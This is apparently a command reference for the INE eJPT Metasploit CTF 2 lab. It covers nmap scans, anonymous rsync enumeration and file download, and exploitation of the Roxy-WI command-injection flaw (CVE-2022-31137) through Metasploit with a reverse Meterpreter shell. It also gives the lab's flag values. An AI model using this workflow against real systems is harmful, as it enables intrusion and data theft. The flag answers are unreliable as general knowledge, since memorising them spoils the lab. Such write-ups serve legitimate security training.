# Command Reference: Host & Network Penetration Testing – The Metasploit Framework CTF 2

This document provides a clean, categorized, copy-paste-friendly command reference documenting the attack workflow executed during the **INE eJPT Host & Network Penetration Testing: The Metasploit Framework CTF 2** assessment.

Each command is annotated with its operational environment (`Kali Linux (bash)`, `msfconsole`, `Meterpreter`, or `Linux Interactive Shell`), technical purpose, parameter explanations, expected results, and screenshot references.

---

## 1. Target 1: Reconnaissance & Port Scanning

### Full TCP Port Sweep on Target 1 (`target1.ine.local`)
**Environment:** `Kali Linux (bash)`
```bash
nmap -T4 -sV -sC -p- target1.ine.local
```
- **What it does**: Scans all 65,535 TCP ports (`-p-`), probes for service versions (`-sV`), and runs default NSE detection scripts (`-sC`) at an aggressive timing template (`-T4`) against `target1.ine.local` (`192.244.166.3`).
- **Why it is used**: Rapidly maps the full exposed attack surface of Target 1.
- **Key Parameters**:
  - `-T4`: Sets timing template to aggressive for faster scanning on local virtual networks.
  - `-sV`: Performs banner grabbing and version detection on open ports.
  - `-sC`: Executes default Nmap scripts.
  - `-p-`: Scans the entire port range from 1 to 65535.
- **Expected Result**: Identifies open port `873/tcp` running `rsync` (protocol version 31).
- **Screenshot Reference**: `02-nmap-target1-rsync-scan.png` (Screenshot 02).

---

## 2. Target 1: RSYNC Enumeration & Data Exfiltration (Flags 1 & 2)

### Querying RSYNC Modules and Banner (Flag 1 Retrieval)
**Environment:** `Kali Linux (bash)`
```bash
rsync target1.ine.local::
```
- **What it does**: Connects anonymously to the RSYNC daemon on `target1.ine.local` (port 873) using double-colon (`::`) syntax to query exposed module names and descriptions.
- **Why it is used**: Fulfills Objective 1 by inspecting the RSYNC service banner and module comments for exposed information.
- **Expected Result**:
  ```text
  backupwscohen   FLAG1_7956a8a6e8084699a3b659f13b06bdb0
  ```
- **Verified Flag 1 Value**: `FLAG1_7956a8a6e8084699a3b659f13b06bdb0`
- **Screenshot Reference**: `03-target1-rsync-banner-flag1.png` (Screenshot 03).

### Listing Files Within the RSYNC Module
**Environment:** `Kali Linux (bash)`
```bash
rsync --list-only target1.ine.local::backupwscohen/
```
- **What it does**: Lists all directory entries and permissions within the `backupwscohen` module without downloading them.
- **Why it is used**: Allows reconnaissance of file names, timestamps, and sizes prior to exfiltration.
- **Key Parameters**:
  - `--list-only`: Directs the rsync client to print the file list only.
- **Expected Result**: Confirms presence of `TPSData.txt` (20 bytes), `office_staff.vhd` (25 bytes), and `pii_data.xlsx` (39 bytes).
- **Screenshot Reference**: `04-target1-rsync-module-listing.png` (Screenshot 04).

### Exfiltrating Files from the RSYNC Share
**Environment:** `Kali Linux (bash)`
```bash
mkdir rsync_files
rsync -av target1.ine.local::backupwscohen/ ./rsync_files/
```
- **What it does**: Creates a local staging directory (`rsync_files`) and recursively downloads all files from the remote `backupwscohen` module.
- **Why it is used**: Clones exposed backup files locally for offline forensic inspection.
- **Key Parameters**:
  - `-a` (`--archive`): Preserves permissions, ownership, timestamps, and recursively traverses directories.
  - `-v` (`--verbose`): Outputs transfer progress and file names.
- **Expected Result**: Transfers 3 files totaling 84 bytes.
- **Screenshot Reference**: `05-target1-rsync-file-download.png` (Screenshot 05).

### Inspecting Downloaded Files (Flag 2 Retrieval)
**Environment:** `Kali Linux (bash)`
```bash
cd rsync_files
ls
cat TPSData.txt
cat pii_data.xlsx
```
- **What it does**: Navigates into the download directory, lists files, and reads the contents of `TPSData.txt` and `pii_data.xlsx`.
- **Observed Result**:
  ```text
  Sample data for TPS
  FLAG2_eabf8eb725164d73992246eb77fde35b
  ```
- **Verified Flag 2 Value**: `FLAG2_eabf8eb725164d73992246eb77fde35b`
- **Screenshot Reference**: `06-target1-flag2-retrieval.png` (Screenshot 06).

---

## 3. Target 2: Reconnaissance & Service Enumeration

### Full TCP Port Sweep on Target 2 (`target2.ine.local`)
**Environment:** `Kali Linux (bash)`
```bash
nmap -T4 -sV -sC -p- target2.ine.local
```
- **What it does**: Conducts an exhaustive TCP sweep against `target2.ine.local` (`192.244.166.4`).
- **Why it is used**: Maps the web services, SSL configuration, and hostnames hosted on Target 2.
- **Key Parameters**: Same as Target 1 scan.
- **Expected Result**: Identifies `80/tcp` (HTTP) and `443/tcp` (HTTPS) running Apache `httpd 2.4.52` on Ubuntu, hosting the `Roxy-WI` web management application with SSL certificate issued for `*.roxy-wi.org`.
- **Screenshot Reference**: `07-nmap-target2-service-scan.png` (Screenshot 07).

---

## 4. Metasploit Framework Setup & Auxiliary Enumeration

### Launching msfconsole in Quiet Mode
**Environment:** `Kali Linux (bash)`
```bash
msfconsole -q
```
- **What it does**: Starts the Metasploit Framework interactive console suppressing the ASCII banner for a faster, clean terminal environment.

### Workspace Management & Database Import (Methodology Reference)
**Environment:** `msfconsole`
```text
msf6 > workspace -a ctf2_msf
msf6 > db_nmap -T4 -sV -sC -p- 192.244.166.3 192.244.166.4
msf6 > hosts
msf6 > services
```
- **What it does**: Creates a dedicated project workspace (`ctf2_msf`), runs Nmap directly through Metasploit to store target hosts and services in PostgreSQL, and verifies active targets.

### Auxiliary RSYNC Module Listing (Metasploit Enumeration)
**Environment:** `msfconsole`
```text
msf6 > use auxiliary/scanner/rsync/modules_list
msf6 auxiliary(scanner/rsync/modules_list) > set rhosts target1.ine.local
msf6 auxiliary(scanner/rsync/modules_list) > run
```
- **What it does**: Automates querying the RSYNC daemon on `target1.ine.local` for accessible shares and banners through the Metasploit auxiliary scanner.
- **Why it is used**: Demonstrates Metasploit-native auxiliary enumeration per Objective 1.

---

## 5. Exploitation: Roxy-WI Command Injection (Target 2)

### Searching for Roxy-WI Exploit Modules
**Environment:** `msfconsole`
```text
msf6 > search Roxy-WI
```
- **What it does**: Searches the Metasploit exploit database for modules targeting the Roxy-WI web application.
- **Observed Result**:
  ```text
  #  Name                              Disclosure Date  Rank       Check  Description
  -  ----                              ---------------  ----       -----  -----------
  0  exploit/linux/http/roxy_wi_exec   2022-07-06       excellent  Yes    Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE
  ```
- **Screenshot Reference**: `08-msf-search-roxy-wi.png` (Screenshot 08).

### Selecting and Inspecting Module Options
**Environment:** `msfconsole`
```text
msf6 > use 0
msf6 exploit(linux/http/roxy_wi_exec) > options
```
- **What it does**: Loads `exploit/linux/http/roxy_wi_exec` (CVE-2022-31137) and inspects required module parameters and default payload (`cmd/unix/python/meterpreter/reverse_tcp`).
- **Screenshot Reference**: `09-msf-roxy-wi-options.png` (Screenshot 09).

### Configuring Exploit Parameters
**Environment:** `msfconsole`
```text
msf6 exploit(linux/http/roxy_wi_exec) > set rhosts 192.244.166.4
msf6 exploit(linux/http/roxy_wi_exec) > set lhost 192.244.166.2
```
- **What it does**:
  - `set rhosts 192.244.166.4`: Sets the target IP address (`target2.ine.local`).
  - `set lhost 192.244.166.2`: Sets the local listening IP of the Kali attacker machine.
  - Defaults retained: `RPORT 443`, `SSL true`, `TARGETURI /`, `LPORT 4444`.

### Firing the Exploit
**Environment:** `msfconsole`
```text
msf6 exploit(linux/http/roxy_wi_exec) > exploit
```
- **What it does**:
  1. Starts reverse TCP handler on `192.244.166.2:4444`.
  2. Runs built-in vulnerability check (`Checking if 192.244.166.4:443 is vulnerable!`).
  3. Verifies target responds with HTTP 200 OK and test command execution (`The target is vulnerable`).
  4. Delivers the Python command injection payload.
  5. Catches the incoming reverse staged connection (24,772 bytes) and opens Meterpreter session 1.
- **Observed Result**: `Meterpreter session 1 opened (192.244.166.2:4444 -> 192.244.166.4:55752)`.
- **Screenshot Reference**: `10-msf-roxy-wi-exploitation.png` (Screenshot 10).

---

## 6. Session Management & Initial Access Verification

### Interacting with Meterpreter & Spawning a Linux Shell
**Environment:** `Meterpreter`
```text
meterpreter > cd ..
meterpreter > cd /
meterpreter > shell
```
- **What it does**: Navigates to the root directory inside Meterpreter and invokes the `shell` command to spawn a native Linux terminal channel.
- **Observed Result**:
  ```text
  Process 365 created.
  Channel 1 created.
  /bin/bash -i
  bash: cannot set terminal process group (362): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@target2:/$
  ```
- **Operational Identity**: Confirmed shell running under the `www-data` service account context on `target2`.
- **Screenshot Reference**: `11-meterpreter-shell-target2.png` (Screenshot 11).

---

## 7. Flag 3 Retrieval: Root Filesystem Enumeration

### Locating and Reading `flag.txt`
**Environment:** `Linux Command Shell (bash)`
```bash
cd ..
ls
cat flag.txt
```
- **What it does**: Confirms root directory location (`/`), lists filesystem entries, and reads `flag.txt`.
- **Observed Result**:
  ```text
  bin boot dev etc flag.txt home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var
  FLAG3_aa0038d5756743bfa80796ebea45bdd2
  ```
- **Verified Flag 3 Value**: `FLAG3_aa0038d5756743bfa80796ebea45bdd2`
- **Screenshot Reference**: `12-target2-flag3-retrieval.png` (Screenshot 12).

---

## 8. Flag 4 Retrieval: Scheduled Tasks (Cron) Investigation

### Navigating to `/etc` and Recursively Grepping for Flags
**Environment:** `Linux Command Shell (bash)`
```bash
cd etc
grep -ri "flag" /etc
```
- **What it does**: Traverses to `/etc` and runs a case-insensitive recursive search (`grep -ri`) across all configuration files and subdirectories.
- **Why it is used**: Fulfills Objective 4 by systematically discovering clues left in automated tasks (cron jobs), service configs, or system scripts without knowing the exact file path.
- **Key Parameters**:
  - `-r`: Recursively read all files under `/etc`.
  - `-i`: Ignore case distinctions in patterns and input data.
- **Observed Result**:
  ```text
  grep: /etc/shadow: Permission denied
  grep: /etc/.pwd.lock: Permission denied
  grep: /etc/security/opasswd: Permission denied
  grep: /etc/gshadow: Permission denied
  grep: /etc/sudoers.d/README: Permission denied
  grep: /etc/sudoers: Permission denied
  grep: /etc/mysql/debian.cnf: Permission denied
  grep: /etc/shadow-: Permission denied
  grep: /etc/ssl/private: Permission denied
  grep: /etc/gshadow-: Permission denied
  /etc/cron.d/www-data-cron:* * * * * www-data echo "FLAG4_d489d5d9736b4975bb8e644eb6335e4c"
  ```
- **Verified Flag 4 Value**: `FLAG4_d489d5d9736b4975bb8e644eb6335e4c`
- **Location**: `/etc/cron.d/www-data-cron`
- **Screenshot Reference**: `13-target2-flag4-cron-discovery.png` (Screenshot 13).

---

## 9. Summary of Verified Flag Values

| Flag | Target Host | Operating Context | Source / Location | Verified Flag String | Validation Status |
| :---: | :---: | :--- | :--- | :--- | :---: |
| **Flag 1** | `target1.ine.local` (`192.244.166.3`) | Anonymous RSYNC Query | `target1.ine.local::backupwscohen` (Banner) | `FLAG1_7956a8a6e8084699a3b659f13b06bdb0` | Visually Verified |
| **Flag 2** | `target1.ine.local` (`192.244.166.3`) | Anonymous RSYNC Download | `backupwscohen/pii_data.xlsx` | `FLAG2_eabf8eb725164d73992246eb77fde35b` | Visually Verified |
| **Flag 3** | `target2.ine.local` (`192.244.166.4`) | `www-data` Interactive Shell | `/flag.txt` | `FLAG3_aa0038d5756743bfa80796ebea45bdd2` | Visually Verified |
| **Flag 4** | `target2.ine.local` (`192.244.166.4`) | `www-data` Interactive Shell | `/etc/cron.d/www-data-cron` | `FLAG4_d489d5d9736b4975bb8e644eb6335e4c` | Visually Verified |
